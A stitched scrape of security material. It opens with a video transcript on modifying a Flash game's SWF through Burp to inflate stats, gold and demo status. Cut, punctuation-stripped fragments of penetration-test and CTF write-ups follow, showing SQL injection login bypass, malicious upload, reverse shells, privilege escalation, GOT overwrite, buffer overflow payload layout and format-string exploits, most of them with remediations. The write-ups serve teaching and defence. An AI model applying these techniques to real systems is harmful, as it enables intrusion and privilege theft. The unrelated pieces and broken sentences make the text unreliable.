because we re doing all of this client side it s important to intercept the response to this quest because we re going to be performing a get request to get this swf file so after we click forward the server is sending us the swf file so this is where we want to intercept that response here is the compiled swf file this is it all of this so what i m going to do is copy this to a file i ll call it sandals 2 swf and i ll save it and i ll go here and there it is there s the sandals swf if we do a files on this it says that it s just data and then the reason it s data and not seen as some kind of special swf file is because of all of this data here is where the swf file starts so let s delete all of this until we get to that part okay here we go uh now if you perform the same command on it it will say that it s a macrometer flash data okay so now we re going to put this into jpex s file open sandals2 swf  Music  okay so now it s decompiled uh when hacking any kind of flash player game you re going to get the script kind of folder and this is where the real meat of the game is this is what you re going to want to be looking for uh so there s all these different buttons uh remember this check mark button that was in the game well there s many different check mark buttons in the game depending on what kind of function it does there s one for buying an item there s one for just saying yes or no to uh what kind of name you want um so let s look at like what these buttons do we press on what happens when you release so this is a button for game over whenever you die there s this check mark button you click on it game over your characters erased and whatnot now here s the 720 button and with uh hacking video games you just got to be really persistent looking at all of these different buttons seeing what looks really nice the 720 button is interesting in particular because we have a leveled up function here and it tells us what happens whenever we level up so when we level up we go from level one to level two because of this plus one here well let s not wait until we level up let s go straight to level 50 or level let s say level 49 right below 50  um let s go straight to level 49 that way we don t have to wait till we level up and here is the variable for your level okay so let s just put that straight up here at the start we click on edit action script and let s put it right here root game hero level let s make us level 49  um yeah that looks pretty good all right let s just save this okay um let s look at some other buttons i m just going down here to look at so many more buttons here s another check uh here s a plus which if you remember in the character sheet this is what our skill points were about and whenever we hit that plus our strength went up by one but our skill points went from i think we started at nine then it went to eight and every single time we press the plus we got less and less points that s because of this minus equals if we change that to plus equals then instead of losing a skill point every single time we click on that plus button we instead gain a skill point and how about instead of gaining just one strength we gain 100 that would be fun okay let s do that um see we got a minus that s not that interesting another plus what s this other plus about well this other plus is about our agility our speed uh okay i ll just put i ll just do the same thing and i mean you could do the same thing for all of these different skill points it s i ve done it before and i will send a link on in the description as well of my github which will have the hacked version of the swf and it will have something like this for every single skill i m not going to show in this video but you get the idea how to do it you just go here click on plus change that and so forth so okay we have that um another thing if you remember there was a demo thing we couldn t buy armor because it was part of we re we re in a demo and we don t have the full version so what we can do is click on tools text search and let s see where in this code is this demo where is it saying that we are in demo mode so these are all the different places in the code where the word demo appears i ve already done this before so i can tell you that here is really where it s saying that we are in demo mode we are in global gamemode demo you can see like here for example uh where is it ah here bubble tech sorry friend the tournament name is locked in the demo version if tournament number and global name equals demo uh okay so what does it look like in the full version of the game let s see what where that might appear if if global game mode is a demo equals demo then that s just demo mode but what is the full version what s the word that we use for that so i m just gonna go here and see where it says something like fool um there we go global game mode equals full so we verified that whenever we put global game mode equals full that that means full version okay so let s just go back here and let s change this word to full edit action script and type in full okay let s see what else uh so we changed the strength um let s see what where we can put gold because we started off with think like 2500 something like that so let s find where gold is so let s do this type in gold and we see tons of different options let s click on this one and here is our gold uh this is the variable root game hero gold pieces is the variable that we re looking for and um let s just give ourselves a ton of money so we saw that 720 is where the game kind of starts uh so let s just put right here at the start of the game um one three three seven one three three seven gold so now when we start the game we should have that much gold okay um and i think that that looks good um i don t know if i want to do anything else  Music  i think this was also an interesting button uh you need to distribute all of your skill points before continuing let s change step points greater than zero to i don t know something huge so we never get that text okay i think that s good let s just uh save this here then what we ll do is this request instead of having this compiled by a compiled swf running on our client side let s have our hacked version so to do that i m going to just cut this using ctrl x i m going to delete everything here paste back what i cut and click on paste from file first i right clicked on burp suite then clicked on paste from file and then click sales2 swf and it s just loading here because i think it was like a two megabyte file or something like that okay let s forward this and turn off intercept you don t need to intercept anything anymore and let s see if our hack worked let s see if it worked so create new gladiator okay as soon as we clicked strength we gained a hundred strength and we gained a skill point okay so now we re so big that our head isn t even on the screen um same thing here gains a hundred and anyways you could do the same thing with the tag defense all of that um okay let s just i ll put the rest right here let s just go here oh this is just the intro again we it says we re level one which means our other code did not get executed yet but we start off with 170 health instead of i think it was 110 before or something like that and we just did 603 damage on that person uh we have leveled up to level 50  okay and now uh doesn t show how much gold you have if you go to the armory we have one three three seven one three three seven gold and let s see if we re still in demo mode we are not because when we hover over this it no longer says we have to be in demo mode to buy this so we can now buy cool looking armor now let s buy this one okay well there s that that was easy okay so um you get the idea so you could do this with any kind of flash game i know that flash games are not really served anymore because of their vulnerabilities like in 2011 alone there were 63 vulnerabilities there s also buffalo overflow vulnerabilities some rce which is remote code execution vulnerabilities that s the worst and there s also denial of service attacks all kinds of different attacks that were performed due to vulnerabilities of adobe flash but in any case as you can see that doesn t mean it s dead that there s no more swf files served by servers anymore the it could even work within emulators which is what i demonstrated here so anyways thank you for watching remember don t do anything illegal and yeah thanks for watching this video bye",

website  the  administrative page was found which involved a simple login page  The username field is vulnerable to a critical SQL injection  which an attacker could leverage to login as an administrative user  access sensitive local files  and extract usernames and password hashesFollowing the authentication bypass  an insecure image upload feature could be exploited to gain RCE on the target  After obtaining a shell as the www data user  escalating privileges to the local kyle user could be done by way of cracking his hash in the dev SQL database  The kyle user was part of the filter group which allowed for editing the configuration files of the SMTP service running locally on port 25  Because this service was running as the john user  getting a shell via the service resulted in compromising his accountFinally  the john user is part of the management group which has access to the apt repository configuration files  A cronjob running as root which performed a frequent apt get update command could therefore be taken advantage of  and obtaining root privileges was possible through adding a reverse shell file in the apt configurations  Please view the  Post

However  no virtual host routing is presentSQL InjectionWhen inputting  OR 1 1     as the username and choosing a random value for the password  the user is automatically authenticated  thus confirming the presence of SQL injection  As an authenticated user  stories can be edited and created  and pictures can be uploaded reports Writer image5 png The web page does not properly check if an uploaded file is an image  as it was possible to upload a reverse shell by the name of php reverse shell jpg php  This  however  did not lead to RCE as the web page nevertheless treated the file as an image  Furthermore  uploading a malicious image with PHP code did not workAn addition to the image upload feature is the ability to upload files given a url  This could be utilized to cause the server

AnalysisThis section goes into further detail about the vulnerabilities of the target and how to mitigate them  Note that the mitigations shown in this section are incomplete pieces of code  however they are secure implementations of the desired resultSQLi Mitigation  PDOThis machine contained multiple vulnerabilities  starting with the SQL injection in the  administrative page  The vulnerability lies in the following SQL statement that is performed on the user s queryhighlight sql  Select   From users Where username     s  And password     s      username  password    endhighlightThis insecure SQL statement allows an attacker to add a single quote in their username and then perform an arbitrary SQL statement of their choosing  To mitigate SQL injection attacks  the current recommendation is to use PDO  PHP Data Objects   The following code does not directly pass the user input into the SQL statement  Rather  using PDO tells the server what the SQL query and the user inputted data are  This is successfully performed because the instruction and user input are sent separately to the databasehighlight php   phptryconn   new PDO  mysql host  servername dbname  dbname

RCE due to insecure python code  System commands and evaluation functions should never be performed on user input  As discussed in  Finding RCE Vulnerability   h eswqky3qu6hx   the system   function in the os module was the reason for the critical RCE vulnerability  The following code prevents this vulnerabilityhighlight python from werkzeug utils import secure filenamefrom PIL import Imagefilename   request file  imageimage   StringIO base64 b64decode download  file    allowed extensions     jpg   jpeg  if filename split       1  in allowed extensions           try

image save path       except Exception                 print  Invalid image     else             print  Filename extension not allowed       endhighlight   The above program verifies if a file is a valid image by first checking its extension  Note that this is different from the source code of the website which simply searches for the presence of the  jpg string in the filename  After verifying the file s extension  PIL s verify method is called on the file before the file is uploaded to the img directoryConclusionMultiple vulnerabilities were present on the target which resulted in a full compromise of the system  The  administrative page contained an SQL injection vulnerability which resulted in the leakage of local files and authentication bypass  After authenticating to the server  the insecure handling of filenames led to an RCE vulnerabilityAfterwards  the privilege escalation to root involved logging into the system as the kyle user who had permissions to edit the mail service  Due to the service running under john  the lateral movement involved adding a reverse shell to the configuration of the service  As the john user  apt configurations could be modified to exploit an apt get update cronjob running as the root user  Observe the following remediations to mitigate the vulnerabilities outlined in the reportSecure the SQL login page on  administrativePDO should be used in place of the insecure SQL statement  see  SQLi Mitigation  PDO    h nw8pksu8e5re   Never use system   or any sort of evaluation function on user input The system command on the uploaded filename resulted in RCE Never reuse passwordsAs the www data user  kyle s password could be retrieved by cracking his hash from the dev database  This would not have been of much use if the local kyle user had a different password on the target Passwords should be secure Fix misconfigurations related to the kyle and john userkyle was able to edit a service that was run by john  To mitigate this  the service should either be run by kyle  or kyle should not have permissions to edit the service john was able to edit apt configurations  This sort of privilege should not be granted to any user  By adding a reverse shell to the apt configurations  any user who runs the apt command can be compromised by john 1    ftnt ref1   https   github com OJ gobuster  https   www google com

disabled Building system   bin sh  After discovering the addresses of the system   function and  bin sh string  it follows that the system   bin sh   call must be built and executed using the aforementioned addresses  To do so  it is important to be able to control the RDI register which is used to pass parameters into functions  The RDI  RSI  RDX  and RCX registers are all used for that purpose  but they function via a hierarchical basis  in which the parameter passed into a function follows that particular order  3    ftnt3some function parameter1 parameter2 parameter3

arbitrary code execution  ASLR and enabling the NX bit are not adequate in the prevention of binary exploitation  however they do help mitigate vulnerabilities   The following remediations should be strongly considered to prevent the attack outlined in this reportReplace the gets   function with fgets  The latter performs boundary checks on user input which mitigates buffer overflow attacksImplement PIEReturn to libc attacks worked by calculating the addresses of the system function and base libc address based on their known offersBy enabling PIE  the known offsets between

coupled with the improper usage of the libc scanf   function  consequently lead to the execution of the  bin cat system command upon passing a carefully constructed malicious string  Specifically  the second parameter of scanf   was not an integer pointer value as it was not prepended with an ampersand  Taking advantage of insecure code and the fact that the binary in question is dynamically linked  an attacker is capable of overwriting the GOT entry of printf   or fflush   to jump to any place in the binary s memoryAttack NarrativeThe source code and compiled binary of the program were provided

 welcome    and login    The main   function  however  is not of interest as it only calls printf   and the welcome   and login   functions  Looking at welcome    a buffer name 100  is initialized with 100 bytes  Afterwards  the scanf   function is called with  100s as the first argument  up to 100 bytes of data are passed into the aforementioned buffer and subsequently printed out when passed into printf    this behavior is examined in the  Taking Advantage of name 100    h 4ie0e0v86pcw  section   After welcome   is called  the login   function is executedTwo variables are initialized  int passcode1 and int passcode2  Following the initialization of these variables  scanf   d   passcode1  is called  but the second argument is not an integer pointer  as it is not prepended with the ampersand symbol   Next  fflush stdin  is called as opposed to fflush stdout   Incidentally  usage of the former is not recommended as it can invoke strange behavior due to it being undefined  The call to fflush   is meant for output streams only in which the buffered data is outputted to the console  1    ftnt1   The scanf   function is then called again in which the second argument is not prepended with the ampersand symbol  Lastly  an if statement is run which is true when passcode1 is equal to 338150 and passcode2 is equal to 13371337  On the condition that this is true  the flag located on the target system is read outExecuting BinaryExecuting the binary with the input of 338150 for passcode1 and 13371337 for passcode2 results in a segmentation faulthighlight bash     0xd4y

0xcc07c9            13371337   endhighlightTherefore  the input passed into the second parameter of the scanf   function has the ability to overwrite memoryTaking Advantage of name 100 Recall that welcome   only allocated 100 bytes to user input and implemented the scanf   function with the  s format specifier  The insecurity relating to this utilization of scanf   lies within the fact that it does not perform boundary checks on the user input  This unsafe practice results in a security hole in which user input can overflow the area in memory allocated for this buffer if the developer does not provide a safe value for the field width specifier  In the case of this binary  providing an input of larger than 100 bytes can result in the overflow of otherwise inaccessible memory located within login    This is because the field width specifier is 100   100s  and 100 bytes were allocated to the name buffer  Therefore  the trailing null byte will spill into memory located right after the buffer  To demonstrate this concept  observe the following1   First  the login   function is disassembled to find when the initial if statement occurshighlight bash pwndbg  disass loginDump of

nature of this binary  passing in 338150 as passcode1 and 13371337 as passcode2 does not result in the expected execution of  bin cat  rather a segmentation fault occurs  see  Examining Segmentation Fault   h thgrlc2mq99l    Therefore  in order to execute  bin cat  it is essential that the program is manipulated to point to an address after the if statement and before the call to the system command  Looking at the disassembly of the login   function  this leaves the following addresses  0x080485d7  0x080485de  and 0x080485e3  For the purposes of this report  the 0x080485d7 address is

 it is important to realize what dynamic linking is and how it operatesUnderstanding Dynamic LinkingWhen a binary is dynamically linked  the libc calls within the program do not point to any meaningful addresses  Take the following snippet from passcode for examplehighlight bash 0x08048593   47      call   0x8048430  fflush plt 0x08048598   52      mov    eax 0x80487860x0804859d   57

0x8048420 respectively  Since this binary is dynamically linked  before the binary is ever run  fflush   and printf    and any other libc function for that matter  refer to placeholder addresses such as 0x00000000  However  once the program is loaded  these addresses are resolved using the help of the Global Offset Table  GOT  and Procedure Linkage Table  PLT   a table which converts position independent function calls to absolute locations  3    ftnt3   When a libc function is called  the first thing the PLT does is jump to the GOT  Global Offset Table  entry of the called function  The GOT maps symbols  such as printf    to their actual location  4    ftnt4   Thus  when the exploit was passed into the binary  the GOT entry which maps printf   to its actual location was overwritten to instead point to 0x080485d7Examining the GOT Overwrite in GDBThe way the binary handles the malicious input can be examined more in detail within GDB  After disassembling the login   function  it

the leakage of otherwise inaccessible data  Compiler warnings should never be ignored  Unsafe practices involving user input can lead to security holes  The scanf   function was improperly used  and is not recommended when dealing with strings  unless the developer is careful of the field width specifier and allocated buffer size   Furthermore  the second argument of scanf   was not prepended with the ampersand symbol  which allowed for the passing of an address causing the overwrite of printf    The following remediations should be strongly consideredPrepend scanf   with the amerpand symbol    Failure to do so allowed for the direct passing of an addressWhen dealing with strings  allocate at most a field width that is one less than the bufferDue to name 100  having 100 bytes  the scanf   field width specifier should be 99 instead of 100 to take into account the null byteUse sscanf   in conjunction with getline   when dealing with user inputted stringsgetline   automatically allocates an appropriate buffer size to safely fit the input string  5    ftnt5 The buffer of getline   can then be parsed with sscanf  The aforementioned remediations should be followed as soon as possible to prevent the attack described in this report  It is essential that the developer follow safe programming practices especially when dealing with user input1    ftnt ref1   https   www

dynamic analysis  and Ghidra  2    ftnt2   for static analysis  are used throughout this reportGhidraMany different programs can be used for static analysis  however Ghidra  a tool created by the NSA  is utilized throughout this report because of its capability to translate assembly code into C code for easier analysis  Looking at the output of Ghidra  the following three functions are found reports You Know image2 png Within main   the string You know who are 0xDiablos  is printed out before the vuln   function is executed  This function allocates 180 bytes to the buffer local bc before the vulnerable gets   function is executed with local bc as the argument  The gets   function is a deprecated function within C due to its inability to perform boundary checks on the user input  The manual for the function states to  Never use this function   3    ftnt3The third function of the binary  namely flag    was not called by either main   or vuln    The flag   function checks if a file flag txt exists  If it does  then it performs an if statement in which it compares the param 1 and param 2 to certain hex values  On condition that this if statement is true  the contents of flag txt are read outGDB        Analysing this function through GDB helps in dissecting what the program is doing on the assembly levelhighlight bash 0x08049246   100     cmp    DWORD PTR  ebp 0x8  0xdeadbeef

statement compares the value of the base pointer   8 to 0xdeadbeef and the base pointer   12 to 0xc0ded00d  Therefore  a successful exploit will constitute the control of the foregoing base pointer addresses along with the overwriting of the EIP register to point to the flag   functionConstructing ExploitEIP OffsetThe offset of the EIP register overwrite must first be determined  Within GDB  in order to provide an input to a program which prompts the user for a string  the desired string must first be echoed into a file  The contents of this file can then be run within the debugger  Hence  using the cyclic function  a pattern of 200 bytes was echoed into a file called eip overwrite as followshighlight bash    0xd4y Writeup     business hackthebox easy windows love

Buff3r 1s not healthy    0xd4y Writeup     business hackthebox challenges pwn easy you knowendhighlightConclusionThe binary in question was vulnerable to a buffer overflow attack due to the lack of boundary checks performed on user input  The deprecated gets   function was used within the binary despite the security warnings that are associated with it  As a result  memory could be overwritten resulting in behavior that the binary was not written to perform  The following remediations should be strongly consideredNever use the deprecated gets   functionUsage of this function creates the possibility for security risks that could allow malicious actors to run arbitrary codeUse the secure fgets   functionThis function reads user input until a newline character is found or until the buffer gets filledThe aforementioned remediations should be observed as soon as possible  Until this binary is patched  the service running on port 31449 should be disabled1    ftnt ref1   https   www

this process of conversion is to save the state of an objectWhen untrusted user controlled data is saved into an object and an operation is performed on it  potential vulnerabilities could arise  Such is the case with the website discussed within this report  The PHPSESSID serialization cookie  provided upon accessing the website  was passed directly into an include statement  This resulted in a local file inclusion vulnerability  LFI  which was then upgraded to remote code execution  RCEAttack NarrativeOther than having been provided the source code for this challenge  no other information

endhighlightAt the very bottom of the file  the function unserialize is performed on the argument  cookie  This would not result in a vulnerability if the cookie could not be modified by the client  However  this was not true for this challenge  and the web server could therefore be exploited   To fix this insecurity  the json  encode   and json  decode   should be implemented instead  Furthermore  input validation must be carried out on the cookie to ensure that it does not contain unexpected data  such as a different file nameAdditionally  the serialized object should be stored in a database with a unique identifier  The unique identifier would then be the value of the cookie  and its associated data could then be safely retrieved thus removing the ability of the client to modify the object s dataConclusionThe web server was vulnerable to a PHP Object Injection attack  This vulnerability can easily be avoided by practicing the secure methods outlined in the  Post Exploitation Analysis   h px1q03fgnzid  section  The following remediations should be immediately observed to ensure that sensitive local files do not get read by untrusted usersSecure the index php fileAs discussed in the previous section  the json  decode   and json  encode   functions should be used instead of the insecure unserialize   functionInsert object data into a database and use a unique identifierThe aforementioned remediations should be followed as soon as possible  as the system is currently prone to being penetrated by a malicious actor1     ftnt ref1   https   github com

 this service could not be accessed due to the 403 Forbidden error  Nevertheless  due to this file scanner having the functionality of making GET requests  this page could indirectly be accessed through forcing the file scanner to make a request to this service reports Love image14 png After completing the request  credentials to a user by the name of admin are leaked  Piecing this information together with the  Admin Page   h 4wslswsfx98j  found during the HTTP enumeration  it follows that we can login as the administrator  Using the credentials of admin  LoveIsInTheAir

From the output it can be seen that winPEAS detected a misconfiguration in the AlwaysInstallElevated group policy  By default  this policy is set to 0  and it is extremely dangerous to modify this value  When this policy is set to 1  Microsoft Windows Installer Packages  MSI  are installed with system privileges  Therefore  a malicious MSI file that returns a reverse shell can be used to get a

Exploitation AnalysisSQL InjectionThe SQL injection led to the leakage of the Admin password hash  This was due to the lack of user input sanitization  The following code snippet was taken from C xampphtdocsomrslogin php  and is running on the root page of http   10 10 10 239highlight php if isset   POST  login                 voter     POST  voter                                                   password     POST  passwordsql    SELECT   FROM voters WHERE voters id     voter                 query    conn  query  sql      endhighlight   This piece of code was responsible for the SQLi  Note the user query is passed directly into the sql variable  which is used during the connection to the internal SQL server  The user input is passed into the voter variable which is surrounded by single quotes in the SQL query  This was the reason for the SQLi working upon prepending a single quote to the beginning of the input  Note that this same vulnerability is present within C xampphtdocsomrsadminlogin phpBeta php VulnerabilityThe beta php file located at C xampphtdocsFFSbeta php was responsible for the initial foothold on the box  The code performs the curl function on the user query  but does not first check it for potentially malicious characters or stringshighlight php if isset   POST  read                                                     file trim   POST  file

curl close   curlendhighlightHardening this code will require a blacklist which should contain strings such as file  to prevent file      and localhostConclusionThis Windows system contained multiple vulnerabilities  The foothold on the machine started with an insecure file scanner feature located on the HTTPS server  The file scanner fails to sanitize user input  Thus  sensitive files located locally on the system could be read using the file     delimiter at the beginning of the query  Furthermore  sensitive services which are not able to be accessed by outside users  can be accessed by forcing the file scanner to perform a query on itselfA vulnerable version of Voting System software was installed which resulted in the ability to upload malicious PHP files to get a reverse shell  After obtaining a reverse shell  it was found that the box has a misconfiguration relating to the installation feature of Windows  and the enabled AlwaysInstallElevated group policy resulted in the privilege escalation to SYSTEM  The following remediations should be seriously consideredHarden SQL code in login phpSanitize user query  character escaping  blacklist characters  validate input Use stored procedures or parameterized queriesPerform sanitization on user query in the beta php fileUpdate Voting System softwarePoor validation within an image file upload feature resulted in the successful upload of malicious PHP to get a reverse shellModify AlwaysInstallElevated policyEnabling this group policy resulted in escalating privileges from a local account to SYSTEMThis policy should be changed from 1 to 01    ftnt ref1   https   github com OJ gobuster  https   www google com url q https   github com OJ gobuster sa D source editors ust 1653797783782138 usg

gs1ewfmvc73gExecutive SummaryThe attack performed on the target as outlined in this report was conducted without prior knowledge of anything about the client s machine except for its IP address  This was done so as to mimic a real attack from a person of malicious intent  The client s system contained multiple vulnerabilities ranging from local file inclusion to misconfigurations and an insecure SETUID binary  This machine was successfully compromised by exploiting an insecure PHP script to get a reverse shell as a low privileged user  after which we were able to horizontally escalate privileges to a user on the system who had access to a vulnerable SETUID running as root  After the exploitation of this binary  we were able to successfully gain full privileges as root on the Archangel system  The client is highly encouraged to patch the system with the remediations outlined in the  Conclusion   h gs1ewfmvc73g  sectionAttack NarrativeWe are given the IP of the target

is an open ssh port on the box  I tried to read the user s private ssh key to login as the user  However  the attempt to include this file proved to be unsuccessful  this may be due to us not having proper permissions  or the archangel user may not have a private ssh keyAlthough we can include sensitive files on the vulnerable system  it is necessary to convert this LFI vulnerability to an RCE  Remote Code Execution  vulnerability in order to get a shell on the target Log PoisoningThis can be done by log poisoning  1    ftnt1   Looking back at the results of the  nmap scan   h 5u2vk3e7kgnj

endhighlightConclusionThe client is running a vulnerable http service that is at risk of being exploited  A malicious attacker can achieve full root access on this system without trouble  This system must be patched as soon as possible  and the following remediations will provide a stronger defense against possible attacksModify the test php script on the development site to not include user inputted filesThe script can be modified to only whitelist certain file namesFailure to correctly include files resulted in a critical RCE vulnerabilityBe mindful of misconfigurations within the local systemThe www data user was able to modify a critical cronjob run as the archangel user  which allowed for horizontal privilege escalationAlways use full paths when performing any action as a privileged userDue to the improper use of a command in a binary running as root  we were able to escalate privileges to the root user through modifying the PATH environment variableIt is highly encouraged that the system be patched as soon as possible with the aforementioned remediations1    ftnt ref1   https   outpost24 com blog from local file inclusion to remote code execution part 1

will be treated as if we are not given this information  This approach is taken so as to replicate real world environments in which an attacker most likely would not have knowledge on the source code of the binary he or she is trying to exploitThis penetration test resulted in the successful exploitation of all nine out of nine binaries  Among the vulnerabilities were the following  passing unsanitized input into functions  failure to check boundaries  using insecure functions  and unnecessarily disabling the NX bit  Remediations are outlined in the  Conclusion   h susjdnco5e24  section

NarrativeEach binary gets increasingly harder  For every challenge  I have downloaded each binary by copying its base64 or base32 data on my attacking box  This was done to allow a further analysis into the binary by allowing the usage of pwndbg  1    ftnt1   Ghidra  2    ftnt2   and other tools that are not present on the target machineNarnia 0We are given the credentials for the narnia0 user  and with it we can ssh into the boxBinary AnalysisBefore trying to exploit the first binary by testing buffer overflows  we will check the security of the binary with the checksec command reports Narnia image7 png The  Arch  row shows that this binary is a 32 bit program and whose endianness is little endian  Additionally  we can see that NX  non execute   the bit responsible for not allowing writable memories to be executed  is enabled  This means that we cannot inject shellcode into the function  We can get a little more information about the binary by using the file commandhighlight

view what is inside the stack by accessing the ESP register  This register is responsible for pointing to the top of the stack  How the Buffer Relates to the StackThe buffer is where data is temporarily stored  and it is located in the RAM  random access memory  of the computer  When there is improper validation as to the content and size of the buffer  the program can experience an overflow in which inputted data floods the memory of the program reports Narnia image2 png   7    ftnt7  A visual image of how a buffer overflow attack can overwrite memoryAs more data gets inputted into the buffer  the stored data of the program  located in the stack  gets overwritten in the following order1   Local variables2   Saved registers3   Return address4   Function arguments  parameters reports Narnia image4 png   8    ftnt8  A simplified image on how the buffer relates to the stackWhen a program allocates a fixed number of bytes into the buffer  the memory of the buffer will end up spilling into the EBP  base pointer   ESP  stack pointer   and EIP  instruction pointer  registers  The EIP register will hold the return address  while the ESP register contains the data of the program  The EBP register is typically reserved as a backup for the ESP in case the ESP is modified during execution of a function  note that the EBP register can be overflowed as wellConstructing a PayloadNow with the knowledge of the EIP offset  132 bytes   we can construct a payload that will look like the followingJUNK BYTE   132   ADDRESS TO SHELLCODE   NOP SLED   SHELLCODEIn regards to the payload  it is important to emphasize what is the purpose of a NOP sled and what it is  A NOP sled is a series of NOP  no operation  bytes  which is an instruction that occupies space in memory  but tells the program to not do anything  The purpose of a NOP sled in binary exploitation is to allow a greater leniency when determining the proper address to flood the EIP register with  When the shellcode is put after the NOP sled and the instruction pointer is pointing to somewhere within the bounds of the NOP sled  the program will essentially go through each NOP instruction until it executes the shellcodeBinary Exploitation POCBefore the attack was conducted on the target machine  the payload was first executed on the attacking box so as to get a better view as to how to

Essentially  if a user was allowed to execute a binary with permissions of another user  then they could easily modify a program to execute what they would likeDebuggers have to execute the ptrace  process trace  function call to trace a function  this is how debugging programs work   This function prevents execve system calls from elevating privileges on the system  as the privilege elevations flags are ignored  effectively making the user have the same privileges as he or she did before debugging  The only way to execute an SUID binary with the permissions of the effective user  is to run the program as rootBinary AnalysisSeeing as reading the narnia4 s password in the memory of the stack pointer was not successful  we can analyze the binary in Ghidra to see how it works and come up with a different methodology for exploitationhighlight bash void main int param 1 undefined4  param 2undefined local 5c  32   char local 3c  32   undefined4 local 1c  undefined4 local 18  undefined4

as local 5c and local 3c  The program checks if an argument is sent  If not it will provide the usage  otherwise it will perform the strcpy function  a function used to copy strings   This is a dangerous function which can result in buffer overflows  Reading the man page of this function and going to the  Bugs  section  the following description can be readIf the destination string of a strcpy   is not large enough  then anything might happen  Overflowing fixed length string buffers is a favorite cracker technique for taking complete control of the machine  Any time a program reads or copies data into a buffer  the program first needs to check that there s enough space  This may be unnecessary if you can show that overflow is impossible  but be careful  programs can get changed over time  in ways that may make the impossible possibleFollowing the strcpy function are two if statements  one for checking if a file exists  and another for checking if we have valid permissions for opening the file  If the file exists and we have permissions for opening the file  then the read and write functions are executedBefore figuring out how to exploit the binary  we should first understand how it behaves by doing what the program expectshighlight bash narnia3 narnia     narnia narnia3  etc narnia pass narnia4copied contents of  etc narnia pass narnia4 to a safer place      dev null    endhighlightThe program can read the narnia4 password file and copy it to  dev null  However  due to this being the place in linux used for discarding data  we cannot recover the passwordExploiting strcpyGoing back to Ghidra  we can see that the  dev null device is set to the variable local 1c reports Narnia image10 png If there is a buffer overflow vulnerability we can possibly overwrite this local variable  When inputting many strings followed by the word  test   we can see that the program returns an error for opening the program  however not all of the A s that we sent are outputtedhighlight bash narnia3 narnia     narnia narnia3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtesterror opening AAAAAAAAAAAAtest   endhighlightWe can try to create a file called

endhighlightStrangely  the binary now spits out all the A s that we inputted  Recall that we found within Ghidra that 32 bytes are being allocated to two unknown buffers  It is possible that one of the buffers is meant for the name of the input file  while the other buffer is meant for the output  This means that upon creating a long named directory and inputting the full path of a file located within this directory might successfully overwrite the variable allocated for the  dev null device  This methodology was carried out as followshighlight bash narnia3 narnia  tmp  mkdir   python  c  print  S  26  narnia3 narnia  tmp  cd   python  c  print  S  26  narnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSSS  touch testnarnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSSS  chmod 777 test

the binary worksThe error is missing a   at the beginning of the tmp directory  This is because  tmp  is four characters  S is 26 characters  and the trailing   is one character  which completely fills the 32 bytes allocated for the buffer   Therefore  the string after the trailing   of the S directory is what overwrites the variable for the null device  Creating a directory with 27 S s fixes this problem  note that the choice of S s was arbitrary  and any sequence of 27 bytes within the  tmp directory would have workedhighlight bash narnia3 narnia  tmp  mkdir   python  c  print  S  27

if statement  and within it  bin sh gets executed as the narnia6 user  However  due to the local c variable staying unchanged  the if statement is never run  From the code  we can deduce that there is a vulnerability in the following line  snprintf local 4c 0x40   char     param 2   4     This may be surprising  as the manual page for snprintf encourages its usageBUGS      Because sprintf   and vsprintf   assume an arbitrarily long string  callers must be careful not to overflow the actual space  this is often impossible to assure  Note that the length of the strings produced is locale de pendent and difficult to predict   Use snprintf   and vsnprintf   instead  or asprintf 3  and vasprintf 3   Code such as printf foo   often indicates a bug  since foo may contain a   character  If foo comes from un trusted user input  it may contain  n  causing the printf   call to write to memory and creating a security hole The security hole within this function lies in the fact that it uses a buffer of a fixed length with no boundary checks  11    ftnt11snprintf  is safe as you long as you provide the correct length for the buffer  snprintf does guarantee that the buffer won t be overwritten  but it does not guarantee null terminationFormat String ExploitTherefore  upon providing a format character such as  x  the function will spit out addresses from the stack POCnarnia5

contains 8 bytes  The methodology behind a format string attack is finding the address of a local variable that we would like to overwrite  this is given to us as 0xffffd5f0   After discovering the address of the targeted variable  we need to determine where the input gets stored in memory  After finding this information  we can finally overwrite the variable by providing its address followed by the  n format specifierProviding the input string of AAAA followed by the  x format specifier  we can immediately see the position of the input in the stackhighlight bash narnia5 narnia  narnia

of bytes inside the buffer corresponds to the overwriting value for the variable Controlling Variable ValueAfter verifying the ability for overwriting the local variable  we are left with the task of controlling its value  This can be done by padding the buffer using two different methods  Method 1We can use a specifier for the position of the input within the stackhighlight bash narnia5 narnia

within the stack  This method  however  is unstable in comparison to the second method  The payload used does not work when using single quotes around the input  rather only double quotes work  Method 2This method copies the address for the i variable twice before padding it with the necessary amount of bytes  Inputting the address twice was found to be necessary  after a lot of trial and

param 2 1   strcpy local 20  char   param 2 2    endhighlightWithin these two lines lie the vulnerability of the program  Eight bytes are being allocated to the local 18 and local 20 variables  which are then getting passed into the strcpy function with any kind of boundary checks being performed beforehand  The potential danger of this code is outlined within the  BUGS  subsection located in the manual page for the strcpy functionIf the destination string of a strcpy   is not large enough  then anything might happen  Overflowing fixed length string buffers is a favorite cracker technique for taking complete control of the machine  Any time a program reads or copies data into a buffer  the program first needs to check that there s enough space  This may be unnecessary if you can show that overflow is impossible  but be careful  programs can get changed over time  in ways that may make the impossible possibleAdditionally  it is important to check the security of the narnia6 binary with

after printing out the above text  We can use Ghidra to further analyse how the binary functions reports Narnia image13 png There are four functions of interest within the program  main  vuln  goodfunction  and hackedfunction  The main function takes an argument as input and passes it onto the vuln function  This vuln function allocates 128 bytes to the argument  Going further down this function  we can see that the local 84 variable is being assigned to the address of goodfunctionLooking at the code for goofunction  we see that the function simply prints out a message and exits  Interestingly  toward the last line of the vuln function  the snprintf function is called and uses local 84 as an argument  Therefore  it can be deduced that this program is most likely vulnerable to a format string exploit  Seeing as hackedfunction calls  bin sh with setuid privileges  if the local 88 variable is overwritten to point to the address of hackedfunction  then we will receive a shell as the narnia8 userFormat String ExploitThe methodology to exploiting this binary is the same as the one outlined in  Narnia 2   h e4mp3rcoeyar   We can construct a payload that will look like the followingaddress to local 84     PADDINGxThe padding will correspond to the decimal value of the address for hackedfunction so as to overwrite the value of the local 84 with the appropriate address  Note that the program will convert this decimal value into hexadecimal  and the hackedfunction will therefore be executedFrom executing the binary  we saw that the hacked address is located at 0x8048724  Converting this hexadecimal value to decimal  we see that it is equivalent to 134514468  Furthermore  the binary printed out the value for local 84 at 0xffffd568  Therefore  a string comprised of the address to this variable in little endian format  as this binary is in little endian  followed by a padding of 134514468 will result in the execution of hackedfunctionhighlight bash

